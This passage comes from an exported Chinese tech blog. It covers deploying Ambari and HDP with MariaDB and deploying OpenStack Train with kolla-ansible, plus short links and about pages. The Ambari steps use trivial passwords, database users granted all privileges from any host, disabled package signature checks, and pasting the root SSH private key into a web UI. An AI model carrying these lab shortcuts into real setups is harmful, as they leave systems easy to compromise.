/opt/src/maven mv apache-maven-3.6.3/* /opt/src/maven 配置maven环境变量\nvim /root/.bashrc # set maven home export PATH=$PATH:/opt/src/maven/bin 激活\nsource /root/.bashrc 安装Ambari\u0026amp;HDP 1. 配置Ambari. HDP. libtirpc-devel本地源 解压\ntar -zxvf ambari-2.7.5.0-centos7.tar.gz -C /var/www/html/ tar -zxvf HDP-3.1.5.0-centos7-rpm.tar.gz -C /var/www/html/ tar -zxvf HDP-GPL-3.1.5.0-centos7-gpl.tar.gz -C /var/www/html/ tar -zxvf HDP-UTILS-1.1.0.22-centos7.tar.gz -C /var/www/html/ ll /var/www/html/ 总用量 0 drwxr-xr-x. 3 root root 21 11月 23 22:31 ambari drwxr-xr-x. 3 1001 users 21 12月 18 2019 HDP drwxr-xr-x. 3 1001 users 21 12月 18 2019 HDP-GPL drwxr-xr-x. 3 1001 users 21 8月 13 2018 HDP-UTILS 设置设置用户组和授权\nchown -R root:root /var/www/html/HDP chown -R root:root /var/www/html/HDP-GPL chown -R root:root /var/www/html/HDP-UTILS chmod -R 755 /var/www/html/HDP chmod -R 755 /var/www/html/HDP-GPL chmod -R 755 /var/www/html/HDP-UTILS 创建libtirpc-devel本地源\nmkdir /var/www/html/libtirpc mv /root/libtirpc-* /var/www/html/libtirpc/ cd /var/www/html/libtirpc createrepo . 制作本地源\n配置ambari.repo\nvim /etc/yum.repos.d/ambari.repo [Ambari-2.7.5.0] name=Ambari-2.7.5.0 baseurl=http://192.168.150.106/ambari/centos7/2.7.5.0-72/ gpgcheck=0 enabled=1 priority=1 配置HDP和HDP-TILS\nvim /etc/yum.repos.d/HDP.repo [HDP-3.1.5.0] name=HDP Version - HDP-3.1.5.0 baseurl=http://192.168.150.106/HDP/centos7/3.1.5.0-152/ gpgcheck=0 enabled=1 priority=1 [HDP-UTILS-1.1.0.22] name=HDP-UTILS Version - HDP-UTILS-1.1.0.22 baseurl=http://192.168.150.106/HDP-UTILS/centos7/1.1.0.22/ gpgcheck=0 enabled=1 priority=1 [HDP-GPL-3.1.5.0] name=HDP-GPL Version - HDP-GPL-3.1.5.0 baseurl=http://192.168.150.106/HDP-GPL/centos7/3.1.5.0-152 gpgcheck=0 enabled=1 priority=1 配置libtirpc.repo\nvim /etc/yum.repos.d/libtirpc.repo [libtirpc_repo] name=libtirpc-0.2.4-0.16 baseurl=http://192.168.150.106/libtirpc/ gpgcheck=0 enabled=1 priority=1 拷贝到其他节点\nscp /etc/yum.repos.d/* node002:/etc/yum.repos.d/ 查看源\nyum clean all yum repolist 2. 安装mariadb（node001节点执行） 安装MariaDB服务器\nyum install mariadb-server -y 启动并设置开机启动\nsystemctl enable mariadb systemctl start mariadb 初始化\n/usr/bin/mysql_secure_installation [...] Enter current password for root (enter for none): OK, successfully used password, moving on... [...] Set root password? [Y/n] Y New password:123456 Re-enter new password:123456 [...] Remove anonymous users? [Y/n] Y [...] Disallow root login remotely? [Y/n] N [...] Remove test database and access to it [Y/n] Y [...] Reload privilege tables now? [Y/n] Y [...] All done! If you\u0026#39;ve completed all of the above steps, your MariaDB 18 installation should now be secure. Thanks for using MariaDB! 为MariaDB安装MySQL JDBC驱动程序\ntar zxf mysql-connector-java-5.1.40.tar.gz mv mysql-connector-java-5.1.40/mysql-connector-java-5.1.40-bin.jar /usr/share/java/mysql-connector-java.jar 创建需要的数据库\n如果需要ranger，编辑以下⽂件： vim /etc/my.cnf 并添加以下⾏：\nlog_bin_trust_function_creators = 1 重启数据库并登录\nsystemctl restart mariadb mysql -u root -p123456 3. 安装和配置ambari-server（node001节点执行） 安装ambari-server\nyum -y install ambari-server 复制mysql jdbc驱动到/var/lib/ambari-server/resources/\ncp /usr/share/java/mysql-connector-java.jar /var/lib/ambari-server/resources/ 配置/etc/ambari-server/conf/ambari.properties，添加如下行\nvim /etc/ambari-server/conf/ambari.properties server.jdbc.driver.path=/usr/share/java/mysql-connector-java.jar 执行\nambari-server setup --jdbc-db=mysql --jdbc-driver=/usr/share/java/mysql-connector-java.jar 初始化ambari-server\nambari-server setup 1） 提示是否自定义设置。输入：y Customize user account for ambari-server daemon [y/n] (n)? y （2）ambari-server 账号。 Enter user account for ambari-server daemon (root): 如果直接回车就是默认选择root用户 如果输入已经创建的用户就会显示： Enter user account for ambari-server daemon (root):ambari Adjusting ambari-server permissions and ownership... （3）设置JDK。输入：2 Checking JDK... Do you want to change Oracle JDK [y/n] (n)? y [1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8 [2] Custom JDK ============================================================================== Enter choice (1): 2 如果上面选择3自定义JDK,则需要设置JAVA_HOME。输入：/usr/local/java WARNING: JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts. WARNING: JCE Policy files are required for configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts. Path to JAVA_HOME: /usr/local/java Validating JDK on Ambari Server...done. Completing setup... （4）安装GPL，选择：y Checking GPL software agreement... GPL License for LZO: https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html Enable Ambari Server to download and install GPL Licensed LZO packages [y/n] (n)? y （5）数据库配置。选择：y Configuring database... Enter advanced database configuration [y/n] (n)? y （6）选择数据库类型。输入：3 Configuring database... ============================================================================== Choose one of the following options: [1] - PostgreSQL (Embedded) [2] - Oracle [3] - MySQL/ MariaDB [4] - PostgreSQL [5] - Microsoft SQL Server (Tech Preview) [6] - SQL Anywhere ============================================================================== Enter choice (3): 3 （7）设置数据库的具体配置信息，根据实际情况输入，如果和括号内相同，则可以直接回车。如果想重命名，就输入。 Hostname (localhost):node001 Port (3306): 3306 Database name (ambari): ambari Username (ambari): ambari Enter Database Password (bigdata):ambari123 Re-Enter password: ambari123 （8）将Ambari数据库脚本导入到数据库 WARNING: Before starting Ambari Server, you must run the following DDL against the database to create the schema: /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql 这个sql后面会用到，导入数据库 Proceed with configuring remote database connection properties [y/n] (y)? y 登录mariadb创建ambari安装所需要的库\n设置的账号后面配置ambari-server的时候会用到\nmysql -uroot -p123456 CREATE DATABASE ambari; use ambari; CREATE USER \u0026#39;ambari\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;ambari123\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;ambari\u0026#39;@\u0026#39;%\u0026#39;; CREATE USER \u0026#39;ambari\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;ambari123\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;ambari\u0026#39;@\u0026#39;localhost\u0026#39;; CREATE USER \u0026#39;ambari\u0026#39;@\u0026#39;node001\u0026#39; IDENTIFIED BY \u0026#39;ambari123\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;ambari\u0026#39;@\u0026#39;node001\u0026#39;; source /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql show tables; use mysql; select host,user from user where user=\u0026#39;ambari\u0026#39;; CREATE DATABASE hive; use hive; CREATE USER \u0026#39;hive\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;hive\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;hive\u0026#39;@\u0026#39;%\u0026#39;; CREATE USER \u0026#39;hive\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;hive\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;hive\u0026#39;@\u0026#39;localhost\u0026#39;; CREATE USER \u0026#39;hive\u0026#39;@\u0026#39;node001\u0026#39; IDENTIFIED BY \u0026#39;hive\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;hive\u0026#39;@\u0026#39;node001\u0026#39;; CREATE DATABASE oozie; use oozie; CREATE USER \u0026#39;oozie\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;oozie\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;oozie\u0026#39;@\u0026#39;%\u0026#39;; CREATE USER \u0026#39;oozie\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;oozie\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;oozie\u0026#39;@\u0026#39;localhost\u0026#39;; CREATE USER \u0026#39;oozie\u0026#39;@\u0026#39;node001\u0026#39; IDENTIFIED BY \u0026#39;oozie\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;oozie\u0026#39;@\u0026#39;node001\u0026#39;; FLUSH PRIVILEGES; 4. 安装ambari-agent（所有节点执行） pssh -h /node.list -i \u0026#39;yum -y install ambari-agent\u0026#39; pssh -h /node.list -i \u0026#39;systemctl start ambari-agent\u0026#39; 5. 安装libtirpc-devel（所有节点） pssh -h /node.list -i \u0026#39;yum -y install libtirpc-devel\u0026#39; 6. 启动ambari服务 ambari-server start 部署集群 1. 登录界面 http://192.168.150.106:8080\n默认管理员账户登录， 账户：admin 密码：admin\n2. 选择版本，配置yum源 1）选择Launch Install Wizard 2）配置集群名称 3）选择版本并修改本地源地址\n选HDP-3.1(Default Version Definition); 选Use Local Repository; 选redhat7:\nHDP-3.1：http://node001/HDP/centos7/3.1.5.0-152/ HDP-3.1-GPL: http://node001/HDP-GPL/centos7/3.1.5.0-152/ HDP-UTILS-1.1.0.22: http://node001/HDP-UTILS/centos7/1.1.0.22/\n3. 配置节点和密钥 下载主节点的/root/.ssh/id_rsa，并上传！点击下一步，进入确认主机界面\n也可直接cat /root/.ssh/id_rsa 粘贴即可\n验证通过\n4. 勾选需要安装的服务 由于资源有限，这里并没有选择所有服务\n5. 分配服务master 6. 分配服务slaves 设置相关服务的密码 Grafana Admin: 123456 Hive Database: hive Activity Explorer’s Admin: admin\n7. 连接数据库 8. 编辑配置，默认即可 9. 开始部署 10. 安装成功 右上角两个警告是磁盘使用率警告，虚机分配的磁盘较小\n其他问题（正常情况不需要修改） 1. 添加其他系统支持 HDP默认不支持安装到 isoft-serverosv4.2，需手动添加支持\nvim /usr/lib/ambari-server/lib/ambari_commons/resources/os_family.json 添加如下两行，注意缩进和逗号\n2. YARN Registry DNS 服务启动失败 lsof -i:53 kill -9 3. 设置初始检测的系统版本 vim /etc/ambari-server/conf/ambari.properties server.os_family=redhat7 server.os_type=redhat7 参考 https://blog.csdn.net/qq_36048223/article/details/116113987\n","permalink":"https://lvbibir.github.io/posts/tech/deploy_ambari_2.7.5_and_hdp_3.1.5/","summary":"前期准备 1. 安装包准备 Ambari2.7.5. HDP3.1.5. libtirpc-devel: 链接：https://pan.baidu.com/s/1eteZ2jGkSq4Pz5YFfHyJgQ 提取码：6hq","title":"部署Ambari 2.7.5 + HDP3.1.5"},{"content":" Sulv\u0026#39;s Blog 一个记录技术、阅读、生活的博客 lvbibir’s Blog life is a fucking movie 👉友链格式 名称： lvbibir’s Blog 网址： https://lvbibir.github.io 图标： https://image.lvbibir.cn/lvbibir.jpg 描述： life is a fucking movie 👉友链申请要求 秉承互换友链原则、文章定期更新、不能有太多广告、个人描述字数控制在15字内\n","permalink":"https://lvbibir.github.io/links/","summary":"Sulv\u0026#39;s Blog 一个记录技术、阅读、生活的博客 lvbibir’s Blog life is a fucking movie 👉友链格式 名称： lvbibir’s Blog 网址： https://lvbibir.github.io 图标： https://image.lvbibir.cn/lvbibir.jpg 描述： life is a fucking movie 👉友链申","title":"🤝友链"},{"content":" 英文名: Alphonse 职业: 运维工程师 运动: 跑步、steam 博客变更记录\n2022年7月6日 将所有文章的名字改为英文，博客内所有url地址应该全都是英文+下划线+小数点的组合了\nurl中带有中文名太长了而且不好看，查了hugo和papermod的文档，没找到特别好的解决方案，只能通过手动改文章的文件名来实现了\n2022年7月4日 hugo站点试运行，域名：www.lvbibir.cn\n2021年8月15日 将阿里云轻量服务器自带的wordpress应用改为docker应用，wordpress站点改为全docker部署\n2021年7月13日 个人博客站点开始运行，域名：lvbibir.cn\n","permalink":"https://lvbibir.github.io/about/","summary":"英文名: Alphonse 职业: 运维工程师 运动: 跑步、steam 博客变更记录 2022年7月6日 将所有文章的名字改为英文，博客内所有url地址应该全都是英文+","title":"🙋🏻‍♂️关于"},{"content":"kolla ansible简介 kolla 的使命是为 openstack 云平台提供生产级别的、开箱即用的交付能力。kolla 的基本思想是一切皆容器，将所有服务基于 Docker 运行，并且保证一个容器只跑一个服务（进程），做到最小粒度的运行 docker。\nkolla 要实现 openetack 部署总体上分为两步，第一步是制作 docker 镜像，第二步是编排部署。因此，kolla 项目又被分为两个小项目：kolla、kolla-ansible 。\nkolla-ansible项目 https://github.com/openstack/kolla-ansible\nkolla项目 https://tarballs.opendev.org/openstack/kolla/\ndockerhub镜像地址 https://hub.docker.com/u/kolla/\n安装环境准备 官方部署文档： https://docs.openstack.org/kolla-ansible/train/user/quickstart.html\n本次部署train版all-in-one单节点，使用一台centos7.8 minimal节点进行部署，该节点同时作为控制节点、计算节点、网络节点和cinder存储节点使用，同时也是kolla ansible的部署节点。\nkolla安装节点要求：\n2 network interfaces 8GB main memory 40GB disk space\n如果是vmware workstation环境，勾选处理器选项的虚拟化引擎相关功能，否则后面需要配置nova_compute_virt_type=qemu参数，这里选择勾选，跳过以下步骤。\ncat /etc/kolla/globals.yml nova_compute_virt_type: \u0026#34;qemu\u0026#34; #或者部署完成后手动调整 [root@kolla ~]# cat /etc/kolla/nova-compute/nova.conf |grep virt_type #virt_type = kvm virt_type = qemu [root@kolla ~]# docker restart nova_compute kolla的安装要求目标机器至少两块网卡，本次安装使用2块网卡对应管理网络和外部网络两个网络平面，在vmware workstation虚拟机新增一块网卡ens34：\nens32，NAT模式，管理网络，正常配置静态IP即可。租户网络与该网络复用，租户vm网络不单独创建网卡 ens34，桥接模式，外部网络，无需配置IP地址，这个其实是让neutron的br-ex 绑定使用，虚拟机通过这块网卡访问外网。\nens34网卡配置参考： https://docs.openstack.org/install-guide/environment-networking-controller.html\ncat \u0026gt; /etc/sysconfig/network-scripts/ifcfg-ens34 \u0026lt;\u0026lt;EOF NAME=ens34 DEVICE=ens34 TYPE=Ethernet ONBOOT=\u0026#34;yes\u0026#34; BOOTPROTO=\u0026#34;none\u0026#34; EOF #重新加载ens34网卡设备 nmcli con reload \u0026amp;\u0026amp; nmcli con up ens34 如果启用cinder还需要额外添加磁盘，这里以添加一块/dev/sdb磁盘为例，创建为物理卷并加入卷组。\npvcreate /dev/sdb vgcreate cinder-volumes /dev/sdb 注意卷组名称为cinder-volumes，默认与后面的globals.yml中定义一致。\n[root@kolla ~]# cat /etc/kolla/globals.yml | grep cinder_volume_group #cinder_volume_group: \u0026#34;cinder-volumes\u0026#34; 部署kolla ansible 配置主机名,kolla预检查时rabbitmq可能需要能够进行主机名解析\nhostnamectl set-hostname kolla 安装依赖\nyum install -y python-devel libffi-devel gcc openssl-devel libselinux-python python2-pip python-pbr epel-release ansible 配置阿里云pip源，否则pip安装时会很慢\nmkdir ~/.pip cat \u0026gt; ~/.pip/pip.conf \u0026lt;\u0026lt; EOF [global] trusted-host=mirrors.aliyun.com index-url=https://mirrors.aliyun.com/pypi/simple/ EOF 安装 kolla-ansible\nkolla版本与openstack版本对应关系：https://releases.openstack.org/teams/kolla.html\npip install setuptools==22.0.5 pip install pip==20.3.4 pip install wheel pip install kolla-ansible==9.1.0 --ignore-installed PyYAML 复制 kolla-ansible配置文件到当前环境\nmkdir -p /etc/kolla chown $USER:$USER /etc/kolla cp -r /usr/share/kolla-ansible/etc_examples/kolla/* /etc/kolla cp /usr/share/kolla-ansible/ansible/inventory/* . 修改ansible配置文件\ncat \u0026lt;\u0026lt; EOF | sed -i \u0026#39;/^\\[defaults\\]$/ r /dev/stdin\u0026#39; /etc/ansible/ansible.cfg host_key_checking=False pipelining=True forks=100 EOF 默认有all-in-one和multinode两个inventory文件，这里使用all-in-one，来规划集群角色，配置默认即可\n[root@kolla ~]# cat all-in-one | more 检查inventory配置是否正确，执行：\nansible -i all-in-one all -m ping 生成openstack组件用到的密码，该操作会填充/etc/kolla/passwords.yml，该文件中默认参数为空。\nkolla-genpwd 修改keystone_admin_password，可以修改为自定义的密码方便后续horizon登录，这里改为kolla。\n$ sed -i \u0026#39;s#keystone_admin_password:.*#keystone_admin_password: kolla#g\u0026#39; /etc/kolla/passwords.yml $ cat /etc/kolla/passwords.yml | grep keystone_admin_password keystone_admin_password: kolla 修改全局配置文件globals.yml，该文件用来控制安装哪些组件，以及如何配置组件，由于全部是注释，这里直接追加进去，也可以逐个找到对应项进行修改。\ncp /etc/kolla/globals.yml{,.bak} cat \u0026gt;\u0026gt; /etc/kolla/globals.yml \u0026lt;\u0026lt;EOF # Kolla options kolla_base_distro: \u0026#34;centos\u0026#34; kolla_install_type: \u0026#34;binary\u0026#34; openstack_release: \u0026#34;train\u0026#34; kolla_internal_vip_address: \u0026#34;192.168.150.155\u0026#34; # Docker options #docker_registry: \u0026#34;registry.cn-beijing.aliyuncs.com\u0026#34; #docker_namespace: \u0026#34;kollaimage\u0026#34; # Neutron - Networking Options network_interface: \u0026#34;ens32\u0026#34; neutron_external_interface: \u0026#34;ens34\u0026#34; neutron_plugin_agent: \u0026#34;openvswitch\u0026#34; enable_neutron_provider_networks: \u0026#34;yes\u0026#34; # OpenStack services enable_cinder: \u0026#34;yes\u0026#34; enable_cinder_backend_lvm: \u0026#34;yes\u0026#34; EOF 参数说明：\nkolla_base_distro: kolla镜像基于不同linux发型版构建，主机使用centos这里对应使用centos类型的docker镜像即可。 kolla_install_type: kolla镜像基于binary二进制和source源码两种类型构建，实际部署使用binary即可。 openstack_release: openstack版本可自定义，会从dockerhub拉取对应版本的镜像 kolla_internal_vip_address: 单节点部署kolla也会启用haproxy和keepalived，方便后续扩容为高可用集群，该地址是ens32网卡网络中的一个可用IP。 docker_registry: 默认从dockerhub拉取镜像，也可以本地搭建仓库，提前推送镜像上去。 docker_namespace: 阿里云kolla镜像仓库所在的命名空间，dockerhub官网默认是kolla。 network_interface: 管理网络的网卡 neutron_external_interface: 外部网络的网卡 neutron_plugin_agent: 默认启用openvswitch enable_neutron_provider_networks: 启用外部网络 enable_cinder: 启用cinder enable_cinder_backend_lvm: 指定cinder后端存储为lvm\n部署openstack组件 部署openstack\n#预配置，安装docker、docker sdk、关闭防火墙、配置时间同步等 kolla-ansible -i ./all-in-one bootstrap-servers #部署前环境检查 kolla-ansible -i ./all-in-one prechecks #拉取镜像，也可省略该步骤，默认会自动拉取 kolla-ansible -i ./all-in-one pull #执行实际部署，拉取镜像，运行对应组件容器 kolla-ansible -i ./all-in-one deploy #生成openrc文件 kolla-ansible post-deploy 以上部署没有报错中断说明部署成功，所有openstack组件以容器方式运行，查看容器\n[root@kolla ~]# docker ps -a 确认没有Exited等异常状态的容器\n[root@kolla ~]# docker ps -a | grep -v Up 本次部署运行了38个容器\n[root@localhost kolla-env]# docker ps -a | wc -l 39 查看拉取的镜像，发现镜像数量与容器数量是一致的。\n[root@kolla ~]# docker images | wc -l 39 [root@kolla ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-glance-api train aec757c5908a 2 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-keystone-ssh train 2c95619322ed 2 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-keystone-fernet train 918564aa9c01 2 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-keystone train 8d5f3ca2a73c 2 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cinder-api train 500910236e85 2 days ago 1.19GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cinder-volume train f76ebe1e133d 2 days ago 1.14GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cinder-backup train 19342786a92c 2 days ago 1.13GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cinder-scheduler train 920630f0ea6c 2 days ago 1.11GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-heat-api train 517f6a0643ee 2 days ago 1.07GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-heat-api-cfn train 2d46b91d44ef 2 days ago 1.07GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-heat-engine train ab570c135dbc 2 days ago 1.07GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-horizon train a00ddb359ea5 2 days ago 1.2GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-fluentd train 6a5b7be2551b 2 days ago 697MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-cron train 0f784cd532e2 2 days ago 408MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-chrony train 374dabc62868 2 days ago 408MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-iscsid train 575873f9e4b8 2 days ago 413MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-haproxy train 9cf840548535 2 days ago 433MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-keepalived train b2a20ccd7d6a 2 days ago 414MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-openstack-base train c35001fb182b 3 days ago 920MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-compute train 93be43a73a3e 5 days ago 1.85GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-placement-api train 26f8c88c3c50 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-api train 2a9d3ea95254 5 days ago 1.08GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-novncproxy train e6acfbe47b2b 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-conductor train 836a9f775263 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-ssh train f89a813f3902 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-scheduler train 8061eaa33d21 5 days ago 1.05GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-openvswitch-vswitchd train 2b780c8075c6 5 days ago 425MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-openvswitch-db-server train 86168147b086 5 days ago 425MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-rabbitmq train 19cd34b4f503 5 days ago 487MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-mariadb train 882472a192b5 6 days ago 593MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-dhcp-agent train a007b53f0507 7 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-metadata-agent train 8bcff22221bd 7 days ago 1.04GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-nova-libvirt train 539673da5c25 7 days ago 1.25GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-kolla-toolbox train a18a474c65ea 7 days ago 842MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-tgtd train ad5380187ca9 7 days ago 383MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-memcached train 1fcf18645254 7 days ago 408MB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-server train 539cfb7c1fd2 8 days ago 1.08GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-openvswitch-agent train 95113c0f5b8c 8 days ago 1.08GB registry.cn-shenzhen.aliyuncs.com/kollaimage/centos-binary-neutron-l3-agent train fbe9385f49ca 8 days ago 1.08GB 查看cinder使用的卷，自动创建了lvm\n[root@kolla ~]# lsblk | grep cinder ├─cinder--volumes-cinder--volumes--pool_tmeta 253:3 0 20M 0 lvm │ └─cinder--volumes-cinder--volumes--pool 253:5 0 19G 0 lvm └─cinder--volumes-cinder--volumes--pool_tdata 253:4 0 19G 0 lvm └─cinder--volumes-cinder--volumes--pool 253:5 0 19G 0 lvm [root@kolla ~]# lvs | grep cinder cinder-volumes-pool cinder-volumes twi-a-tz-- 19.00g 0.00 10.55 另外需要注意，不要在该节点安装libvirt等工具，这些工具安装后可能会启用libvirtd和iscsid.sock等服务，kolla已经在容器中运行了这些服务，这些服务会调用节点上的sock文件，如果节点上也启用这些服务去抢占这些文件，会导致容器异常。默认kolla在预配置时也会主动禁用节点上的相关服务。\n安装OpenStack客户端 可以直接安装到服务器上或者使用docker安装容器\n推荐使用docker容器方式运行客户端\n使用docker容器作为客户端\ndocker run -d --name client \\ --restart always \\ -v /etc/kolla/admin-openrc.sh:/admin-openrc.sh:ro \\ -v /usr/share/kolla-ansible/init-runonce:/init-runonce:rw \\ kolla/centos-binary-openstack-base:train sleep infinity docker exec -it client bash source /admin-openrc.sh openstack service list yum安装openstack客户端\n#启用openstack存储库 yum install -y centos-release-openstack-train #安装openstack客户端 yum install -y python-openstackclient #启用selinux,安装openstack-selinux软件包以自动管理OpenStack服务的安全策略 yum install -y openstack-selinux #报错处理 pip uninstall urllib3 yum install -y python2-urllib3 运行cirros实例 kolla ansible提供了一个快速创建cirros demo实例的脚本/usr/share/kolla-ansible/init-runonce。\n脚本需要cirros镜像，如果网络较慢可以使用浏览器下载放在/opt/cache/files目录下：\nwget https://github.com/cirros-dev/cirros/releases/download/0.4.0/cirros-0.4.0-x86_64-disk.img mkdir -p /opt/cache/files/ mv cirros-0.4.0-x86_64-disk.img /opt/cache/files/ 定义init-runonce示例脚本外部网络配置：\n#定义init-runonce示例脚本外部网络配置 vim /usr/share/kolla-ansible/init-runonce EXT_NET_CIDR=${EXT_NET_CIDR:-\u0026#39;192.168.35/24\u0026#39;} EXT_NET_RANGE=${EXT_NET_RANGE:-\u0026#39;start=192.168.35.150,end=192.168.35.188\u0026#39;} EXT_NET_GATEWAY=${EXT_NET_GATEWAY:-\u0026#39;192.168.35.1\u0026#39;} #执行脚本，上传镜像到glance，创建内部网络、外部网络、flavor、ssh key，并运行一个实例 source /etc/kolla/admin-openrc.sh /usr/share/kolla-ansible/init-runonce 参数说明：\nEXT_NET_CIDR 指定外部网络，由于使用桥接模式，直接桥接到了电脑的无线网卡，所以这里网络就是无线网卡的网段。 EXT_NET_RANGE 指定从外部网络取出一个地址范围，作为外部网络的地址池 EXT_NET_GATEWAY 外部网络网关，这里与wifi网络使用的网关一致\n根据最终提示运行实例\nopenstack server create \\ --image cirros \\ --flavor m1.tiny \\ --key-name mykey \\ --network demo-net \\ demo1 访问openstack horizon 访问openstack horizon需要使用vip地址，节点上可以看到由keepalived容器生成的vip\n[root@kolla ~]# ip a |grep ens32 2: ens32: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 inet 192.168.150.101/24 brd 192.168.150.255 scope global noprefixroute dynamic ens32 inet 192.168.150.155/32 scope global ens32 浏览器直接访问该地址即可登录到horizon\nhttp://192.168.150.155\n我这里的用户名密码为admin/kolla，信息可以从admin-openrc.sh中获取\n[root@kolla ~]# cat /etc/kolla/admin-openrc.sh # Clear any old environment that may conflict. for key in $( set | awk \u0026#39;{FS=\u0026#34;=\u0026#34;} /^OS_/ {print $1}\u0026#39; ); do unset $key ; done export OS_PROJECT_DOMAIN_NAME=Default export OS_USER_DOMAIN_NAME=Default export OS_PROJECT_NAME=admin export OS_TENANT_NAME=admin export OS_USERNAME=admin export OS_PASSWORD=kolla export OS_AUTH_URL=http://192.168.150.155:35357/v3 export OS_INTERFACE=internal export OS_ENDPOINT_TYPE=internalURL export OS_IDENTITY_API_VERSION=3 export OS_REGION_NAME=RegionOne export OS_AUTH_PLUGIN=password 默认登录后如下\n在horizion查看创建的网络和实例\n登录实例控制台，验证实例与外网的连通性，cirros用户密码在初次登录时有提示：\n为实例绑定浮动IP地址，方便从外部ssh远程连接到实例\n点击+随机分配一个浮动IP\n在实例界面可以看到绑定的浮动ip\n在kolla节点上或者在集群外部使用SecureCRT等ssh工具连接到实例。cirros镜像默认用户密码为cirros/gocubsgo，该镜像信息官网有介绍： https://docs.openstack.org/image-guide/obtain-images.html#cirros-test\n[root@kolla ~]# ssh cirros@192.168.35.183 cirros@192.168.35.183\u0026#39;s password: 运行CentOS实例 centos官方维护有相关cloud image，如果不需要进行定制，可以直接下载来运行实例。\n参考：https://docs.openstack.org/image-guide/obtain-images.html\nCentOS官方维护的镜像下载地址： http://cloud.centos.org/centos/7/images/\n也可以使用命令直接下载镜像，但是下载可能较慢，建议下载好在进行上传。以centos7.8为例：\nwget http://cloud.centos.org/centos/7/images/CentOS-7-x86_64-GenericCloud-2003.qcow2c 下载完成后上传镜像到openstack，直接在horizon上传即可。也可以使用命令上传。\n注意：默认该镜像运行的实例只能使用ssh key以centos用户身份登录，如果需要使用root远程ssh连接到实例需要在上传前为镜像配置root免密并开启ssh访问。\n参考：https://blog.csdn.net/networken/article/details/106713658\n另外我们的命令客户端在容器中，所有这里有些不方便，首先要将镜像复制到容器中，然后使用openstack命令上传。\n这里复制到client容器的根目录下。\n[root@kolla ~]# docker cp CentOS-7-x86_64-GenericCloud-2003.qcow2c client:/ [root@kolla ~]# docker exec -it client bash ()[root@f11a103c5ade /]# ()[root@f11a103c5ade /]# source /admin-openrc.sh ()[root@f11a103c5ade /]# ls | grep CentOS CentOS-7-x86_64-GenericCloud-2003.qcow2c 执行以下openstack命令上传镜像\nopenstack image create \u0026#34;CentOS78-image\u0026#34; \\ --file CentOS-7-x86_64-GenericCloud-2003.qcow2c \\ --disk-format qcow2 --container-format bare \\ --public 创建实例\nopenstack server create \\ --image CentOS78-image \\ --flavor m1.small \\ 